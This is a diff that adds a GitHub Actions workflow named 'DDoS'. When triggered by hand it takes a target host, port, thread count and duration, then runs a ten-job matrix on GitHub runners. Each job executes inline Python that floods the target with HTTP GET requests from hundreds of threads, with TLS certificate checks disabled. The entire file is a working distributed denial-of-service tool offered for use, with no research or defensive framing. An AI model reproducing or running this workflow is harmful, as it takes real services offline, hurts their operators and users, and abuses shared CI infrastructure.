@@ -1,0 +1,57 @@
+name: DDoS
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target'
+        required: true
+      port:
+        description: 'Port'
+        required: true
+        default: '80'
+      threads:
+        description: 'Threads'
+        required: true
+        default: '500'
+      duration:
+        description: 'Duration'
+        required: true
+        default: '300'
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - name: Run
+        env:
+          TARGET: ${{ github.event.inputs.target }}
+          PORT: ${{ github.event.inputs.port }}
+          THREADS: ${{ github.event.inputs.threads }}
+          DURATION: ${{ github.event.inputs.duration }}
+        run: |
+          python3 -c "
+          import socket,threading,random,time,ssl,os
+          h=os.environ['TARGET'];p=int(os.environ['PORT']);t=int(os.environ['THREADS']);d=int(os.environ['DURATION'])
+          UA=['Mozilla/5.0','Mozilla/5.0 (Macintosh)'];P=['/','/index.html'];s=0;l=threading.Lock()
+          def w():
+              global s;e=time.time()+d
+              while time.time()<e:
+                  try:
+                      so=socket.socket();so.settimeout(3);so.connect((h,p))
+                      if p==443:
+                          c=ssl.create_default_context();c.check_hostname=False;c.verify_mode=ssl.CERT_NONE;so=c.wrap_socket(so,server_hostname=h)
+                      so.send(f'GET {random.choice(P)} HTTP/1.1
+Host: {h}
+Connection: keep-alive
+
+'.encode());so.close()
+                      with l:s+=1
+                  except:pass
+          for _ in range(t):threading.Thread(target=w,daemon=True).start()
+          time.sleep(d+5);print(f'[DONE]{s}')
+          "
